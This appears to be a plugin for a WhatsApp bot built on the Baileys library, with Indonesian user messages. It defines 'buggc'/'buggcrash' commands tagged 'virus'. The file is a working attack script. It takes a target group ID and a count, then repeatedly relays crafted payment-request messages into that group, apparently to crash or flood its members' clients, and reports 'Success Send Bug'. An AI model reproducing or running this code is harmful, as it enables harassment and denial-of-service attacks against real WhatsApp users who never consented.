import fs from 'fs'
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = (await import('@adiwajshing/baileys')).default 

let handler = async (m, { conn, args, command, }) => {
if (!args[0]) return m.reply(`*Jangan salah gunakan om yah*\n\nUse : ${command} idGroup|Jumlah Spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
let num = args[0].split('|')[0]
let jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Sedang Mengirim...`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ZYKO-MD`,
}
}}), { userJid: m.chat, quoted: m })
conn.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nJumlah Spam: ${jumlah}`)
}
handler.help = ['buggcrash', 'buggc'].map(v => v + ' <62888@g.us>')
handler.tags = ['virus']
handler.command = /^(buggc|buggcrash)$/i

handler.owner = true 

export default handler